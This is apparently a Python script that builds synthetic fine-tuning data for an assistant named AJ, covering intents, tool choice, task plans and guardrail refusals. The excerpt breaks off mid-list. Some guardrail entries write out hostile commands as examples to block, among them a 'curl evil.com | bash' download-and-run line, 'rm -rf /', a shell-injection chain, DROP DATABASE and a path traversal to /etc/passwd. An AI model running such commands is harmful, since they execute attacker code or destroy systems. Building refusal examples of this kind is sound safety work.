#!/usr/bin/env python3
"""
AJ Training Data Extractor

Extracts and generates training data from the AJ project for fine-tuning.
Produces 5 output files:
- intent_classification.jsonl
- tool_selection.jsonl
- task_planning.jsonl
- guardrails.jsonl
- architecture_qa.jsonl
"""

import json
import re
import ast
import random
from pathlib import Path
from typing import List, Dict, Tuple

# =============================================================================
# PATHS
# =============================================================================

PROJECT_ROOT = Path(__file__).parent.parent.parent.parent
OUTPUT_DIR = Path(__file__).parent.parent / "data"

# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

INTENT_SYSTEM_PROMPT = "Classify the user's intent as either 'task' (requires file operations, code execution, workspace changes) or 'conversational' (questions, explanations, chat)."

TOOL_SELECTION_SYSTEM_PROMPT = """You are AJ, an AI assistant that selects the appropriate tool for tasks.

Available tools:
- scan_workspace: Scan and index files in workspace
- read_file: Read contents of a file (params: file_path)
- write_file: Write/create a file (params: file_path, content)
- append_to_file: Append to existing file (params: file_path, content)
- delete_file: Delete a file (params: file_path)
- list_agents: Discover available FunnelCloud agents
- remote_execute: Execute command on remote agent (params: agent_name, command)
- execute_shell: Run shell command locally (params: cmd)
- complete: Task is finished
- none: No action needed

Respond with a JSON object containing 'tool' and 'params'."""

TASK_PLANNING_SYSTEM_PROMPT = """You are AJ, an AI assistant that breaks down tasks into steps.

Given a user task, create a plan with 2-5 concrete steps. Each step should be:
- Specific and actionable
- Verifiable (you can check if it succeeded)
- Sequential (later steps may depend on earlier ones)

Respond with a JSON object containing 'steps' (array of strings) and 'reasoning'."""

GUARDRAIL_SYSTEM_PROMPT = """You are AJ, an AI assistant with safety guardrails.

You must:
- Never execute remote commands without first verifying agent availability
- Stop if you detect you're in a loop (same action 2+ times)
- Report errors gracefully instead of retrying indefinitely
- Never fabricate results - if something fails, say so

Analyze the situation and respond appropriately."""

ARCHITECTURE_SYSTEM_PROMPT = "You are an expert on the AJ/FunnelCloud/Mesosync system architecture. Answer questions accurately based on your knowledge of the codebase."

# =============================================================================
# INTENT CLASSIFICATION DATA
# =============================================================================

INTENT_CLASSIFICATIONS: List[Tuple[str, str]] = [
    # Task intents - actions requiring execution
    ("Create a new Python file", "task"),
    ("Write a function to sort this list", "task"),
    ("Delete the temp folder", "task"),
    ("Run the tests", "task"),
    ("Build the Docker container", "task"),
    ("Deploy to production", "task"),
    ("Update the config file", "task"),
    ("Install numpy package", "task"),
    ("Start the dev server", "task"),
    ("Commit these changes", "task"),
    ("Push to main branch", "task"),
    ("Create a database migration", "task"),
    ("Add authentication to the API", "task"),
    ("Refactor this function", "task"),
    ("Fix the bug in login", "task"),
    ("Set up the testing framework", "task"),
    ("Configure eslint", "task"),
    ("Add a new route handler", "task"),
    ("Connect to the remote server", "task"),
    ("List files on my Windows PC", "task"),
    ("Check disk space on the agent", "task"),
    ("Run Get-Process on dev-workstation", "task"),
    ("Find large files on S: drive", "task"),
    ("Execute this PowerShell script", "task"),
    ("Restart the service on remote machine", "task"),
    ("Copy files from remote to local", "task"),
    ("Monitor CPU usage on the agent", "task"),
    
    # Conversational intents - questions, explanations
    ("What is Python?", "conversational"),
    ("How does async/await work?", "conversational"),
    ("Explain the difference between let and const", "conversational"),
    ("Why is my code slow?", "conversational"),
    ("What are best practices for REST APIs?", "conversational"),
    ("Tell me about microservices", "conversational"),
    ("How do I debug memory leaks?", "conversational"),
    ("What's the purpose of dependency injection?", "conversational"),
    ("Why use TypeScript over JavaScript?", "conversational"),
    ("Explain SOLID principles", "conversational"),
    ("What is the singleton pattern?", "conversational"),
    ("How does garbage collection work?", "conversational"),
    ("What's new in Python 3.12?", "conversational"),
    ("Compare React and Vue", "conversational"),
    ("What is functional programming?", "conversational"),
    ("How do databases handle transactions?", "conversational"),
    ("What is a closure?", "conversational"),
    ("Explain recursion", "conversational"),
    ("What's the difference between HTTP and HTTPS?", "conversational"),
    ("How do JWT tokens work?", "conversational"),
    ("Thanks for the help!", "conversational"),
    ("I understand now", "conversational"),
    ("That makes sense", "conversational"),
    ("Got it, thanks", "conversational"),
    ("Hello", "conversational"),
    ("Good morning", "conversational"),
]

# =============================================================================
# TOOL SELECTION DATA
# =============================================================================

TOOL_SELECTION_MAPPINGS: List[Tuple[str, str, dict]] = [
    # File operations
    ("Create a file called test.txt with 'Hello World'", "write_file", {"file_path": "/workspace/test.txt", "content": "Hello World"}),
    ("Read the contents of config.json", "read_file", {"file_path": "/workspace/config.json"}),
    ("Delete the temporary file temp.log", "delete_file", {"file_path": "/workspace/temp.log"}),
    ("Add a new line to notes.txt", "append_to_file", {"file_path": "/workspace/notes.txt", "content": "\nNew note"}),
    ("Show me all Python files in the workspace", "scan_workspace", {}),
    ("List all .py files", "scan_workspace", {}),
    
    # Remote execution
    ("List files on my Windows PC", "list_agents", {}),
    ("Run Get-Process on the remote machine", "remote_execute", {"command": "Get-Process"}),
    ("Check disk space on the agent", "remote_execute", {"command": "Get-PSDrive -PSProvider FileSystem"}),
    ("Find large files on S: drive", "remote_execute", {"command": "Get-ChildItem S:\\ -Recurse | Sort-Object Length -Descending | Select-Object -First 10"}),
    
    # Local shell
    ("Run pip install requests", "execute_shell", {"cmd": "pip install requests"}),
    ("Show current directory", "execute_shell", {"cmd": "pwd"}),
    
    # Completion
    ("I've finished creating the project structure", "complete", {}),
    ("All tasks are done", "complete", {}),
    
    # No action
    ("Thanks for the help!", "none", {}),
    ("I understand now", "none", {}),
    
    # More file operations
    ("Create a new TypeScript file called utils.ts", "write_file", {"file_path": "/workspace/utils.ts", "content": "// Utility functions\n"}),
    ("What's in the package.json?", "read_file", {"file_path": "/workspace/package.json"}),
    ("Remove the old backup file", "delete_file", {"file_path": "/workspace/backup.old"}),
    ("Append a TODO to the readme", "append_to_file", {"file_path": "/workspace/README.md", "content": "\n## TODO\n- Add tests\n"}),
    ("Index the project files", "scan_workspace", {}),
    ("Find all JavaScript files", "scan_workspace", {}),
    ("Show me the project structure", "scan_workspace", {}),
    ("Read the main entry point", "read_file", {"file_path": "/workspace/src/index.ts"}),
    ("Create a .gitignore file", "write_file", {"file_path": "/workspace/.gitignore", "content": "node_modules/\n.env\ndist/\n"}),
    ("Check the tsconfig settings", "read_file", {"file_path": "/workspace/tsconfig.json"}),
    ("Make a new Python module", "write_file", {"file_path": "/workspace/utils/__init__.py", "content": ""}),
    ("Delete the dist folder", "delete_file", {"file_path": "/workspace/dist"}),
    ("Show the contents of .env.example", "read_file", {"file_path": "/workspace/.env.example"}),
    ("Add logging to the end of main.py", "append_to_file", {"file_path": "/workspace/main.py", "content": "\nlogger.info('Application started')\n"}),
    ("Create a Dockerfile", "write_file", {"file_path": "/workspace/Dockerfile", "content": "FROM python:3.11-slim\nWORKDIR /app\nCOPY . .\n"}),
    
    # More remote execution scenarios
    ("Check memory usage on the Windows machine", "remote_execute", {"command": "Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 10"}),
    ("Get system info from my PC", "remote_execute", {"command": "Get-ComputerInfo | Select-Object CsName, WindowsVersion"}),
    ("List running services on the agent", "remote_execute", {"command": "Get-Service | Where-Object {$_.Status -eq 'Running'}"}),
    ("Check network connections on remote", "remote_execute", {"command": "Get-NetTCPConnection -State Established"}),
    ("What agents are connected?", "list_agents", {}),
    ("Find all agents on the network", "list_agents", {}),
    ("Show available FunnelCloud agents", "list_agents", {}),
    ("Get the current user on the Windows PC", "remote_execute", {"command": "$env:USERNAME"}),
    ("Run ipconfig on the remote machine", "remote_execute", {"command": "ipconfig"}),
    ("Check CPU usage on the agent", "remote_execute", {"command": "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5"}),
    ("List scheduled tasks on Windows", "remote_execute", {"command": "Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'}"}),
    ("Check event logs on the agent", "remote_execute", {"command": "Get-EventLog -LogName System -Newest 10"}),
    
    # More local shell commands
    ("Install the dependencies", "execute_shell", {"cmd": "npm install"}),
    ("Run the tests", "execute_shell", {"cmd": "npm test"}),
    ("Build the project", "execute_shell", {"cmd": "npm run build"}),
    ("Check Python version", "execute_shell", {"cmd": "python --version"}),
    ("List files in current directory", "execute_shell", {"cmd": "ls -la"}),
    ("Create a virtual environment", "execute_shell", {"cmd": "python -m venv venv"}),
    ("Run the linter", "execute_shell", {"cmd": "npm run lint"}),
    ("Start the dev server", "execute_shell", {"cmd": "npm run dev"}),
    ("Check disk space", "execute_shell", {"cmd": "df -h"}),
    ("Run database migrations", "execute_shell", {"cmd": "npx prisma migrate dev"}),
    ("Generate types", "execute_shell", {"cmd": "npm run generate"}),
    ("Format the code", "execute_shell", {"cmd": "npm run format"}),
    
    # More completion scenarios
    ("The task is complete", "complete", {}),
    ("Everything is set up now", "complete", {}),
    ("Done with the refactoring", "complete", {}),
    ("Finished updating all the files", "complete", {}),
    ("The project structure is ready", "complete", {}),
    ("Migration complete", "complete", {}),
    
    # More no-action scenarios
    ("Got it, thanks!", "none", {}),
    ("Makes sense now", "none", {}),
    ("I appreciate the explanation", "none", {}),
    ("Perfect, I'll try that", "none", {}),
    ("Okay, I see", "none", {}),
    ("That answers my question", "none", {}),
    ("Great explanation", "none", {}),
    
    # Context-aware tool selection
    ("Now that I've read the config, update the port to 3001", "write_file", {"file_path": "/workspace/config.json", "reasoning": "Modifying existing configuration based on prior read"}),
    ("After scanning, read the largest Python file", "read_file", {"reasoning": "Follow-up to workspace scan requires reading specific file"}),
    ("The agent is available, now check its logs", "remote_execute", {"command": "Get-EventLog -LogName Application -Newest 20"}),
]

# =============================================================================
# TASK PLANNING DATA
# =============================================================================

TASK_PLANNING_EXAMPLES: List[Tuple[str, dict]] = [
    (
        "Create a basic Python project with README, main.py, and requirements.txt",
        {
            "steps": [
                "Create README.md with project description",
                "Create main.py with basic hello world code",
                "Create requirements.txt with common dependencies",
                "Verify all files were created correctly"
            ],
            "reasoning": "Breaking down into individual file creation steps allows verification at each stage"
        }
    ),
    (
        "Find the largest files on my Windows PC's C: drive",
        {
            "steps": [
                "Verify FunnelCloud agent is available using list_agents",
                "Execute PowerShell command to scan C: drive for file sizes",
                "Sort results by size and report top 10"
            ],
            "reasoning": "Must verify agent availability before attempting remote execution"
        }
    ),
    (
        "Refactor the config.py file to use environment variables",
        {
            "steps": [
                "Read current contents of config.py",
                "Identify hardcoded values that should be environment variables",
                "Rewrite config.py using os.environ.get()",
                "Verify the changes are syntactically correct"
            ],
            "reasoning": "Need to understand current code before modifying it"
        }
    ),
    (
        "Set up a new API endpoint in the FastAPI server",
        {
            "steps": [
                "Scan workspace to find existing API files",
                "Read the main API file to understand the pattern",
                "Create new endpoint following existing conventions",
                "Verify syntax and imports are correct"
            ],
            "reasoning": "Following existing patterns ensures consistency"
        }
    ),
    (
        "Set up a new Node.js project with TypeScript",
        {
            "steps": [
                "Create package.json with npm init",
                "Install TypeScript and type definitions",
                "Create tsconfig.json with appropriate settings",
                "Create src/index.ts with basic entry point",
                "Add build and start scripts to package.json"
            ],
            "reasoning": "Setting up TypeScript requires proper configuration before code can be written"
        }
    ),
    (
        "Add error handling to the API routes",
        {
            "steps": [
                "Scan workspace to identify all route files",
                "Read each route file to understand current error handling",
                "Create a central error handling middleware",
                "Update routes to use try-catch and proper error responses",
                "Add error logging integration"
            ],
            "reasoning": "Must understand current patterns before adding systematic error handling"
        }
    ),
    (
        "Debug why the tests are failing",
        {
            "steps": [
                "Run the test suite to see current failures",
                "Read the failing test files to understand expected behavior",
                "Read the implementation files being tested",
                "Identify the discrepancy between expected and actual",
                "Fix the code or tests as appropriate"
            ],
            "reasoning": "Need to understand both test expectations and implementation before debugging"
        }
    ),
    (
        "Migrate the database schema",
        {
            "steps": [
                "Read current migration files to understand schema history",
                "Create new migration file with schema changes",
                "Run migration in development environment",
                "Verify migration applied correctly",
                "Document the changes"
            ],
            "reasoning": "Database migrations require careful sequencing to avoid data loss"
        }
    ),
    (
        "Set up CI/CD pipeline for the project",
        {
            "steps": [
                "Scan workspace to understand project structure and build process",
                "Create .github/workflows directory",
                "Create CI workflow file with lint, test, and build steps",
                "Add deployment workflow for main branch",
                "Verify workflow syntax is valid"
            ],
            "reasoning": "CI/CD setup requires understanding the project's build and test process first"
        }
    ),
    (
        "Add authentication to the API",
        {
            "steps": [
                "Read existing API code to understand the structure",
                "Create authentication middleware",
                "Add login and register endpoints",
                "Update existing routes to require authentication",
                "Add tests for authentication flow"
            ],
            "reasoning": "Authentication requires middleware setup before protecting existing routes"
        }
    ),
    (
        "Optimize the slow database queries",
        {
            "steps": [
                "Identify the slow queries from logs or profiling",
                "Read the query implementations in the codebase",
                "Analyze query execution plans",
                "Add appropriate indexes or optimize queries",
                "Verify performance improvement"
            ],
            "reasoning": "Query optimization requires identifying bottlenecks before making changes"
        }
    ),
    (
        "Deploy the application to production",
        {
            "steps": [
                "Verify all tests pass in the current state",
                "Build the production artifacts",
                "Update environment configuration for production",
                "Deploy to production server",
                "Run smoke tests to verify deployment"
            ],
            "reasoning": "Deployment should only proceed after verification and proper build"
        }
    ),
    (
        "Refactor the monolithic service into modules",
        {
            "steps": [
                "Scan workspace to map current file structure",
                "Identify logical boundaries for modules",
                "Create module directory structure",
                "Move related files into appropriate modules",
                "Update imports throughout the codebase"
            ],
            "reasoning": "Refactoring requires understanding current structure before reorganizing"
        }
    ),
    (
        "Add logging throughout the application",
        {
            "steps": [
                "Install and configure logging library",
                "Create logging utility module",
                "Add logging to API endpoints",
                "Add logging to service layer",
                "Configure log rotation and storage"
            ],
            "reasoning": "Logging setup should be centralized before adding throughout codebase"
        }
    ),
    (
        "Create API documentation",
        {
            "steps": [
                "Scan workspace to identify all API endpoints",
                "Read each endpoint to understand parameters and responses",
                "Create OpenAPI/Swagger specification",
                "Add inline documentation to route handlers",
                "Generate documentation site"
            ],
            "reasoning": "Documentation requires understanding all endpoints before writing"
        }
    ),
    (
        "Fix the memory leak in the application",
        {
            "steps": [
                "Identify where memory is growing using profiling",
                "Read the suspect code areas",
                "Look for unclosed resources or growing collections",
                "Implement proper cleanup and resource management",
                "Verify memory is stable under load"
            ],
            "reasoning": "Memory leak fixes require profiling to identify the source"
        }
    ),
    (
        "Upgrade dependencies to latest versions",
        {
            "steps": [
                "Read package.json to see current versions",
                "Check for available updates with npm outdated",
                "Update dependencies incrementally, starting with patches",
                "Run tests after each significant update",
                "Fix any breaking changes"
            ],
            "reasoning": "Dependency updates should be incremental to isolate breaking changes"
        }
    ),
    (
        "Implement caching for expensive queries",
        {
            "steps": [
                "Identify expensive queries worth caching",
                "Set up Redis cache connection",
                "Create caching utility functions",
                "Add caching to identified queries",
                "Implement cache invalidation strategy"
            ],
            "reasoning": "Caching requires infrastructure setup before application integration"
        }
    ),
    (
        "Add WebSocket support for real-time updates",
        {
            "steps": [
                "Set up WebSocket server alongside HTTP",
                "Create connection management logic",
                "Implement message routing",
                "Add client-side WebSocket handler",
                "Integrate with existing features for real-time updates"
            ],
            "reasoning": "WebSocket requires server setup before feature integration"
        }
    ),
    (
        "Configure UniFi VLANs for IoT device isolation",
        {
            "steps": [
                "Create new IoT network with dedicated VLAN ID",
                "Configure DHCP settings for IoT subnet",
                "Create firewall rules to block IoT-to-LAN traffic",
                "Assign IoT SSID to new network",
                "Test that IoT devices cannot reach main LAN"
            ],
            "reasoning": "VLAN isolation requires network creation before firewall rules"
        }
    ),
    (
        "Migrate monolith to microservices architecture",
        {
            "steps": [
                "Identify bounded contexts within the monolith",
                "Create API contracts between identified services",
                "Extract first service with lowest dependencies",
                "Set up inter-service communication (message queue or API gateway)",
                "Gradually extract remaining services",
                "Implement distributed tracing for debugging"
            ],
            "reasoning": "Microservices migration requires careful planning to avoid breaking changes"
        }
    ),
    # Additional task planning examples
    (
        "Set up a PostgreSQL database with initial schema",
        {
            "steps": [
                "Start PostgreSQL container using Docker",
                "Create database and user",
                "Design initial schema tables",
                "Create migration files",
                "Run migrations to set up schema"
            ],
            "reasoning": "Database setup requires running instance before schema creation"
        }
    ),
    (
        "Implement user registration with email verification",
        {
            "steps": [
                "Create user registration endpoint",
                "Add email service configuration",
                "Generate verification token on registration",
                "Send verification email with token",
                "Create email verification endpoint"
            ],
            "reasoning": "Registration flow requires email service setup for verification"
        }
    ),
    (
        "Add Swagger/OpenAPI documentation to existing Express API",
        {
            "steps": [
                "Install swagger-jsdoc and swagger-ui-express",
                "Create swagger configuration file",
                "Add JSDoc comments to existing routes",
                "Mount Swagger UI endpoint",
                "Verify documentation is complete"
            ],
            "reasoning": "API docs require understanding routes before documenting"
        }
    ),
    (
        "Implement file upload functionality",
        {
            "steps": [
                "Set up multer middleware for multipart handling",
                "Create upload directory with proper permissions",
                "Add upload endpoint with validation",
                "Implement file type and size restrictions",
                "Add file storage or cloud integration"
            ],
            "reasoning": "File uploads need middleware and storage setup first"
        }
    ),
    (
        "Create a data export feature to CSV",
        {
            "steps": [
                "Identify data to be exported",
                "Create query to fetch export data",
                "Install CSV library if needed",
                "Implement CSV formatting logic",
                "Add download endpoint with proper headers"
            ],
            "reasoning": "Export requires understanding data shape before formatting"
        }
    ),
    (
        "Add pagination to list endpoints",
        {
            "steps": [
                "Identify list endpoints needing pagination",
                "Choose pagination strategy (offset vs cursor)",
                "Update queries to support pagination parameters",
                "Add pagination metadata to responses",
                "Update frontend to handle paginated data"
            ],
            "reasoning": "Pagination requires identifying endpoints before implementation"
        }
    ),
    (
        "Implement soft delete for user data",
        {
            "steps": [
                "Add deleted_at column to user table",
                "Update delete endpoints to set timestamp instead of deleting",
                "Modify all queries to exclude soft-deleted records",
                "Add admin endpoint to view/restore deleted users",
                "Schedule job to hard-delete after retention period"
            ],
            "reasoning": "Soft delete requires schema changes before logic updates"
        }
    ),
    (
        "Set up email notifications for system events",
        {
            "steps": [
                "Choose email service (SendGrid, AWS SES, SMTP)",
                "Create email templates for different events",
                "Implement email sending service",
                "Add event hooks to trigger emails",
                "Add user notification preferences"
            ],
            "reasoning": "Email notifications need service setup before event integration"
        }
    ),
    (
        "Add search functionality with Elasticsearch",
        {
            "steps": [
                "Set up Elasticsearch instance",
                "Design index mapping for searchable data",
                "Create indexing pipeline for data sync",
                "Implement search API endpoint",
                "Add search UI with filters and results"
            ],
            "reasoning": "Search requires index setup before query implementation"
        }
    ),
    (
        "Implement role-based access control (RBAC)",
        {
            "steps": [
                "Design roles and permissions model",
                "Create roles table and seed default roles",
                "Add role assignment to users",
                "Create authorization middleware",
                "Protect routes with permission checks"
            ],
            "reasoning": "RBAC requires data model before middleware implementation"
        }
    ),
    (
        "Set up monitoring and alerts",
        {
            "steps": [
                "Identify key metrics to monitor",
                "Add metric collection to the application",
                "Configure monitoring dashboard",
                "Set up alerting rules for critical metrics",
                "Document runbooks for common alerts"
            ],
            "reasoning": "Monitoring requires understanding what's important before configuration"
        }
    ),
    (
        "Add input validation to all endpoints",
        {
            "steps": [
                "Scan workspace to find all API endpoints",
                "Identify expected input schemas for each endpoint",
                "Create validation schemas using zod or joi",
                "Add validation middleware to routes",
                "Add tests for validation error responses"
            ],
            "reasoning": "Validation requires understanding input expectations first"
        }
    ),
    (
        "Create a backup of the database",
        {
            "steps": [
                "Verify database connection details",
                "Create backup script with pg_dump",
                "Execute backup to designated location",
                "Verify backup integrity",
                "Document backup procedure"
            ],
            "reasoning": "Backups require proper connection setup before execution"
        }
    ),
    (
        "Add rate limiting to the API",
        {
            "steps": [
                "Identify endpoints that need rate limiting",
                "Choose rate limiting strategy and storage",
                "Implement rate limiting middleware",
                "Configure limits per endpoint",
                "Add rate limit headers to responses"
            ],
            "reasoning": "Rate limiting requires planning strategy before implementation"
        }
    ),
    (
        "Set up development environment for new developer",
        {
            "steps": [
                "Document required system dependencies",
                "Create setup script for installing dependencies",
                "Create sample .env file with required variables",
                "Document common development commands",
                "Verify setup works on fresh system"
            ],
            "reasoning": "Developer setup documentation must be verified to be complete"
        }
    ),
    (
        "Configure Firewalla for home network security",
        {
            "steps": [
                "Connect Firewalla to router in DHCP mode or Simple mode",
                "Configure devices and groups in Firewalla app",
                "Set up rules for blocking categories (ads, adult, malware)",
                "Enable monitoring and alerts",
                "Test that rules are applying correctly"
            ],
            "reasoning": "Network security requires connection and device recognition before rules"
        }
    ),
    (
        "Set up automated database backups to S3",
        {
            "steps": [
                "Create S3 bucket with appropriate retention policy",
                "Write backup script using pg_dump with compression",
                "Configure AWS credentials securely (IAM role or secrets)",
                "Set up cron job or scheduled task for daily backups",
                "Test backup restoration process",
                "Set up monitoring alerts for backup failures"
            ],
            "reasoning": "Backup automation needs infrastructure and script before scheduling"
        }
    ),
]

# =============================================================================
# GUARDRAIL DATA
# =============================================================================

GUARDRAIL_EXAMPLES: List[Tuple[str, dict]] = [
    # Loop detection
    (
        "Context: You've already tried read_file on /workspace/missing.txt twice and it failed both times.\nTask: Read the file /workspace/missing.txt",
        {"action": "stop", "response": "I've already attempted to read this file twice and it doesn't exist. The file /workspace/missing.txt is not available in the workspace.", "guardrail": "loop_detection"}
    ),
    # No agent available
    (
        "Context: list_agents returned no agents.\nTask: Run Get-ChildItem on the remote Windows PC",
        {"action": "stop", "response": "I cannot execute remote commands because no FunnelCloud agents are currently available. Please ensure the FunnelCloud agent is running on your Windows PC.", "guardrail": "no_agent_available"}
    ),
    # Hallucination prevention
    (
        "Context: No agents discovered. User asked to list files on S: drive.\nTask: Provide the file listing",
        {"action": "stop", "response": "I cannot list files on the S: drive because no FunnelCloud agent is connected. I won't fabricate results. Please start the FunnelCloud agent on the machine with the S: drive.", "guardrail": "hallucination_prevention"}
    ),
    # Max steps reached
    (
        "Context: You've executed 14 steps without completing the task.\nTask: Continue working on the project setup",
        {"action": "complete_partial", "response": "I've made significant progress but reached my step limit. Here's what I've accomplished so far and what remains to be done.", "guardrail": "max_steps"}
    ),
    # More loop detection
    (
        "Context: You've tried to write_file to /workspace/output.txt three times but it keeps failing with permission denied.\nTask: Save the results to output.txt",
        {"action": "stop", "response": "I've attempted to write to output.txt three times but keep getting permission denied. This appears to be a file system permissions issue. Please check the file permissions or try a different location.", "guardrail": "loop_detection"}
    ),
    (
        "Context: You've called scan_workspace four times in this session already.\nTask: Scan the workspace to find Python files",
        {"action": "use_cached", "response": "I've already scanned the workspace multiple times in this session. Using the cached workspace state instead of rescanning.", "guardrail": "loop_detection"}
    ),
    # Agent scenarios
    (
        "Context: list_agents shows dev-workstation is offline.\nTask: Check the disk usage on dev-workstation",
        {"action": "stop", "response": "The dev-workstation agent appears to be offline. I cannot check disk usage without a connected agent. Please verify the FunnelCloud agent is running on dev-workstation.", "guardrail": "no_agent_available"}
    ),
    (
        "Context: No list_agents call has been made this session.\nTask: Delete all temp files on the remote Windows PC",
        {"action": "discover_first", "response": "I need to discover available agents before executing remote commands. Let me first check what FunnelCloud agents are available.", "guardrail": "agent_verification"}
    ),
    # Hallucination prevention
    (
        "Context: read_file failed with 'file not found' for config.yaml.\nTask: Tell me what's in the config.yaml file",
        {"action": "stop", "response": "The config.yaml file doesn't exist in the workspace. I won't make up contents for a file that doesn't exist. Would you like me to create a new config.yaml file instead?", "guardrail": "hallucination_prevention"}
    ),
    (
        "Context: Memory search returned no results for 'database credentials'.\nTask: What are the database credentials we discussed earlier?",
        {"action": "stop", "response": "I don't have any record of database credentials in our conversation history. I won't make up credentials. Could you provide them or point me to where they're stored?", "guardrail": "hallucination_prevention"}
    ),
    # Dangerous commands
    (
        "Context: User wants to delete all files in the workspace.\nTask: Delete everything in /workspace",
        {"action": "confirm", "response": "This will delete ALL files in your workspace. This is a destructive operation that cannot be undone. Are you sure you want to proceed? Please confirm by saying 'yes, delete all files'.", "guardrail": "destructive_operation"}
    ),
    (
        "Context: User wants to run 'rm -rf /' on a connected agent.\nTask: Run rm -rf / on dev-workstation",
        {"action": "block", "response": "I cannot execute this command. 'rm -rf /' is a destructive command that would delete the entire filesystem. This could cause catastrophic data loss and system failure.", "guardrail": "dangerous_command"}
    ),
    (
        "Context: User wants to drop all database tables in production.\nTask: Run DROP DATABASE production",
        {"action": "block", "response": "I cannot execute database DROP commands in production. This would cause complete data loss. If you need to reset the database, please use proper backup/restore procedures.", "guardrail": "dangerous_command"}
    ),
    # Re-read prevention
    (
        "Context: Already read /workspace/src/main.py earlier in this session (step 2).\nTask: Read the main.py file to understand the code",
        {"action": "use_cached", "response": "I already read main.py earlier. Here's what I found: [summary of contents]. No need to re-read unless the file has changed.", "guardrail": "reread_prevention"}
    ),
    # Path validation
    (
        "Context: User wants to write to /etc/passwd\nTask: Add a new user entry to /etc/passwd",
        {"action": "block", "response": "I cannot modify system files like /etc/passwd. This is outside the workspace and could compromise system security. Please use proper user management commands (useradd, etc.).", "guardrail": "path_validation"}
    ),
    (
        "Context: User provided a path with suspicious characters: /workspace/../../../etc/passwd\nTask: Read the file at /workspace/../../../etc/passwd",
        {"action": "block", "response": "This path contains directory traversal patterns (../) that attempt to escape the workspace. I cannot read files outside the designated workspace for security reasons.", "guardrail": "path_traversal"}
    ),
    # Syntax validation
    (
        "Context: User provided malformed PowerShell command.\nTask: Run 'Get-ChildItem -Path C:\\Temp -Filter *.txt | ForEach { $_.Name'",
        {"action": "correct", "response": "The PowerShell command has a syntax error - missing closing brace in ForEach block. Corrected command: 'Get-ChildItem -Path C:\\Temp -Filter *.txt | ForEach { $_.Name }'. Shall I run the corrected version?", "guardrail": "syntax_validation"}
    ),
    # Resource exhaustion
    (
        "Context: User wants to recursively list all files on C: drive.\nTask: List every file on the C: drive recursively",
        {"action": "limit", "response": "Listing every file on C: recursively could take a very long time and produce massive output. I'll limit the search to the first 1000 results or specific directories. Which would you prefer?", "guardrail": "resource_exhaustion"}
    ),
    (
        "Context: User wants to read a 500MB log file.\nTask: Read the entire application.log file (500MB)",
        {"action": "limit", "response": "The log file is 500MB - too large to read entirely. I'll read the last 1000 lines to show recent activity. Or I can search for specific patterns. What would be most helpful?", "guardrail": "resource_exhaustion"}
    ),
    # Credential safety
    (
        "Context: User wants to hardcode API key in source code.\nTask: Add my API key abc123xyz to the config.py file",
        {"action": "warn", "response": "I recommend not hardcoding API keys in source code - they could be accidentally committed to version control. Instead, use environment variables or a .env file (added to .gitignore). Shall I set it up that way?", "guardrail": "credential_safety"}
    ),
    (
        "Context: User shared a password in the chat.\nTask: My database password is 'hunter2', save it to config",
        {"action": "warn", "response": "I see you've shared a password. For security, I won't echo it back. I'll store this in an environment variable or secrets file rather than plain text config. Also consider rotating this password since it's been shared in chat.", "guardrail": "credential_safety"}
    ),
    # Scope limitation
    (
        "Context: User asks AJ to make purchases online.\nTask: Order me a new laptop from Amazon",
        {"action": "stop", "response": "I cannot make online purchases or access external websites. AJ is designed for code assistance and remote system administration via FunnelCloud agents. I can help with coding tasks, file operations, and running commands on your connected machines.", "guardrail": "scope_limitation"}
    ),
    # Shell injection
    (
        "Context: User wants to execute a command with shell injection: ls && rm -rf /\nTask: List files using 'ls && rm -rf /'",
        {"action": "block", "response": "This command contains shell injection - it combines a harmless command with a destructive one using &&. I will not execute commands that contain potential shell injection patterns.", "guardrail": "shell_injection"}
    ),
    # Network safety
    (
        "Context: User wants to download and execute a remote script.\nTask: Run 'curl http://evil.com/script.sh | bash'",
        {"action": "block", "response": "I cannot download and execute scripts from remote URLs in a single command. This is a dangerous pattern that could execute malicious code. Please download the script first, review it, then execute locally.", "guardrail": "remote_code_execution"}
    ),
    # Permission escalation
    (
        "Context: User wants to add themselves to sudoers.\nTask: Add my user to the sudoers file",
        {"action": "block", "response": "I cannot modify sudoers or escalate privileges. This could compromise system security. Please use proper administrative channels to request elevated permissions.", "guardrail": "privilege_escalation"}
    ),
    # Git safety
    (
        "Context: User wants to force push to main branch.\nTask: Run 'git push --force origin main'",
        {"action": "warn", "response": "Force pushing to main can overwrite history and cause problems for other collaborators. It's generally discouraged on shared branches. Are you sure? Consider using 'git push --force-with-lease' instead for safety.", "guardrail": "force_push"}
    ),
    (
        "Context: User wants to commit a .env file to git.\nTask: Add .env to git and commit",
        {"action": "warn", "response": "Warning: .env files typically contain sensitive information like API keys and passwords. Committing them to git could expose secrets, especially if pushed to a public repository. I recommend adding .env to .gitignore instead. Should I help with that?", "guardrail": "secrets_in_git"}
    ),
    # Missing prerequisites
    (
        "Context: User asks to run npm install but no package.json exists.\nTask: Install the dependencies with npm",
        {"action": "stop", "response": "There's no package.json file in this directory. npm install requires a package.json to know what dependencies to install. Would you like me to create one first, or should we navigate to the correct directory?", "guardrail": "missing_prerequisite"}
    ),
    # Connection errors
    (
        "Context: gRPC connection to agent failed with 'connection refused'.\nTask: Continue with the remote file operation",
        {"action": "stop", "response": "Lost connection to the FunnelCloud agent. This usually means the agent process stopped or there's a network issue. Please check: 1) Is the agent process running? 2) Is the machine accessible on the network? 3) Are there any firewall rules blocking gRPC (default port 50051)?", "guardrail": "connection_error"}
    ),
    (
        "Context: Write operation failed with 'disk full' error.\nTask: Save the generated report",
        {"action": "stop", "response": "Cannot save the file - the disk is full. Please free up space on the disk or specify an alternative location with more available space.", "guardrail": "disk_full"}
    ),
    # Consistency
    (
        "Context: Task claims to have found 10 errors but only 3 were discussed.\nTask: Fix all 10 errors we identified",
        {"action": "clarify", "response": "I only identified 3 errors in our previous analysis. Could you clarify which other errors you'd like me to address? I want to make sure we're fixing the right issues.", "guardrail": "consistency_check"}
    ),
    # Additional guardrail examples
    (
        "Context: The remote_execute command on dev-workstation has timed out twice.\nTask: Run the PowerShell script again on dev-workstation",
        {"action": "stop", "response": "The command has timed out twice on dev-workstation. There may be a network issue or the agent may be overloaded. Please check the agent status and try again later.", "guardrail": "loop_detection"}
    ),
    (
        "Context: User asked to run command on 'server-prod' but list_agents only shows 'dev-workstation'.\nTask: Execute systemctl status on server-prod",
